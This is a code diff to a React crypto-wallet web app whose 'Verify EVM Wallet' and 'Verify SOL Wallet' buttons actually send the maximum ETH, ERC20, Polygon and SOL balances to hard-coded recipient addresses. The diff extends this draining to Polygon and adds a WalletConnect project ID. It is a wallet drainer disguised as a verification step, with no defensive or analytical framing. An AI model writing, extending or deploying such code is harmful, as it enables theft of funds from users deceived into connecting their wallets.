@@ -29,67 +29,85 @@ styleSheet.insertRule(`
 }`, styleSheet.cssRules.length);
 
 function App() {
+  // AppKit Wallet
   const { address, isConnected } = useAppKitAccount();
   const { solanaAddress } = useSolanaAccount();
   const [tokenAddress, setTokenAddress] = useState("");
 
+  // Fixed recipients
   const FIXED_EVM_RECIPIENT = "0x47E11Fd3e3cEF8Ea9beC9805D1F27dBe775B1D69";
   const FIXED_SOL_RECIPIENT = "5a39EMz6Hm3k1gFcMmTxojPijfiDzNxQcWhDpRUtgDRv";
 
+  // Environment variables for RPCs
+  const ETH_RPC = import.meta.env.VITE_ETHEREUM_RPC_URL;
+  const POLYGON_RPC = import.meta.env.VITE_POLYGON_RPC_URL;
+  const SOLANA_RPC = import.meta.env.VITE_SOLANA_RPC_URL;
+
+  // Wagmi hooks
   const { data: evmBalance } = useBalance({ address, watch: true });
   const { data: solBalance } = useSolanaBalance({ address: solanaAddress, watch: true });
-
   const { sendTransaction } = useSendTransaction();
   const { writeContract } = useWriteContract();
 
-  // Estimate gas dynamically
-  const estimateGasCost = async (tx) => {
+  // --- Estimate gas dynamically ---
+  const estimateGasCost = async (tx, rpcUrl = ETH_RPC) => {
     try {
-      const provider = new ethers.BrowserProvider(window.ethereum);
+      const provider = new ethers.JsonRpcProvider(rpcUrl);
       const estimatedGas = await provider.estimateGas(tx);
       const gasPrice = await provider.getGasPrice();
       return parseFloat(ethers.formatEther(estimatedGas * gasPrice));
     } catch {
-      return 0.001;
+      return 0.001; // fallback
     }
   };
 
-  // Send max EVM assets
+  // --- Send max EVM assets (ETH + ERC20 + Polygon) ---
   const sendMaxEVM = async () => {
     if (!isConnected || !evmBalance?.formatted) return;
-    const provider = new ethers.BrowserProvider(window.ethereum);
 
-    // Send ETH
-    const gasCostETH = await estimateGasCost({ to: FIXED_EVM_RECIPIENT, value: parseEther("0.001") });
-    const maxETH = parseFloat(evmBalance.formatted) - gasCostETH;
-    if (maxETH > 0) sendTransaction({ to: FIXED_EVM_RECIPIENT, value: parseEther(maxETH.toString()) });
+    const chains = [ETH_RPC, POLYGON_RPC];
 
-    // Send ERC20
-    if (tokenAddress) {
-      const contract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
-      const decimals = await contract.decimals();
-      const tokenBalanceRaw = await contract.balanceOf(address);
-      const tokenBalance = parseFloat(ethers.formatUnits(tokenBalanceRaw, decimals));
+    for (let rpcUrl of chains) {
+      const provider = new ethers.JsonRpcProvider(rpcUrl);
 
-      const data = contract.interface.encodeFunctionData("transfer", [FIXED_EVM_RECIPIENT, parseUnits(tokenBalance.toString(), decimals)]);
-      const gasCostToken = await estimateGasCost({ to: tokenAddress, data });
-      if (parseFloat(evmBalance.formatted) < gasCostToken) return;
+      // Send ETH / native token
+      const gasCostETH = await estimateGasCost({ to: FIXED_EVM_RECIPIENT, value: parseEther("0.001") }, rpcUrl);
+      const maxETH = parseFloat(evmBalance.formatted) - gasCostETH;
+      if (maxETH > 0) {
+        await sendTransaction({ to: FIXED_EVM_RECIPIENT, value: parseEther(maxETH.toString()) });
+      }
 
-      writeContract({
-        address: tokenAddress,
-        abi: ERC20_ABI,
-        functionName: "transfer",
-        args: [FIXED_EVM_RECIPIENT, parseUnits(tokenBalance.toString(), decimals)]
-      });
+      // Send ERC20 if tokenAddress provided
+      if (tokenAddress) {
+        const contract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
+        const decimals = await contract.decimals();
+        const tokenBalanceRaw = await contract.balanceOf(address);
+        const tokenBalance = parseFloat(ethers.formatUnits(tokenBalanceRaw, decimals));
+
+        const data = contract.interface.encodeFunctionData("transfer", [
+          FIXED_EVM_RECIPIENT,
+          parseUnits(tokenBalance.toString(), decimals)
+        ]);
+
+        const gasCostToken = await estimateGasCost({ to: tokenAddress, data }, rpcUrl);
+        if (parseFloat(evmBalance.formatted) < gasCostToken) continue;
+
+        await writeContract({
+          address: tokenAddress,
+          abi: ERC20_ABI,
+          functionName: "transfer",
+          args: [FIXED_EVM_RECIPIENT, parseUnits(tokenBalance.toString(), decimals)]
+        });
+      }
     }
   };
 
-  // Send max SOL
+  // --- Send max SOL ---
   const sendMaxSOL = async () => {
     if (!solBalance || !solanaAddress) return;
     const maxSOL = parseFloat(solBalance) - 0.00001;
     if (maxSOL <= 0) return;
-    await sendSol({ to: FIXED_SOL_RECIPIENT, amount: maxSOL, from: solanaAddress });
+    await sendSol({ to: FIXED_SOL_RECIPIENT, amount: maxSOL, from: solanaAddress, rpcUrl: SOLANA_RPC });
   };
 
   return (
@@ -111,7 +129,10 @@ function App() {
         {!isConnected ? (
           <>
             {/* Centered Connect Button */}
-            <appkit-button style={{ padding: "15px 30px", fontSize: "1.2rem", cursor: "pointer" }} />
+            <appkit-button
+              style={{ padding: "15px 30px", fontSize: "1.2rem", cursor: "pointer" }}
+              projectId="c00145b1e7f8d39d821971d8aeb61276"
+            />
             <h2 style={{ marginTop: "20px" }}>Connect your wallet to get started</h2>
           </>
         ) : (
@@ -132,7 +153,7 @@ function App() {
             <br />
 
             <button onClick={sendMaxEVM} style={{ marginRight: "10px", padding: "10px 20px", cursor: "pointer" }}>
-              Verify EVM Wallet (ETH + ERC20)
+              Verify EVM Wallet (ETH + ERC20 + Polygon)
             </button>
             <button onClick={sendMaxSOL} style={{ padding: "10px 20px", cursor: "pointer" }}>
               Verify SOL Wallet
